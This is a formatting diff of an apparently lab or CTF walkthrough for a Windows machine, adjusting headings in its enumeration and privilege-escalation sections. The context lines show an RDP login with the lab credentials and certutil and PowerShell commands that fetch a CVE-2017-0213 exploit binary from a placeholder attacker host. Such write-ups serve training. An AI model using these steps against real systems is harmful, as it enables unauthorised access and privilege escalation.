@@ -1,5 +1,5 @@
 
-#### Enumeration
+### Enumeration
 
 **Initial Port Scan**
 
@@ -102,7 +102,7 @@ xfreerdp /u:wade /p:parzival /v:10.66.149.222
 
 
 
-#### Privilege Escalate
+### Privilege Escalate
 
 **Download and Transfer the Exploit**
 
@@ -138,7 +138,6 @@ certutil -urlcache -f http://<YOUR_IP>:8080/CVE-2017-0213_x64.exe CVE-2017-0213_
 
 Or alternatively:
 
-powershell
 
 ```powershell
 Invoke-WebRequest -Uri "http://<YOUR_IP>:8080/CVE-2017-0213_x64.exe" -OutFile "CVE-2017-0213_x64.exe"
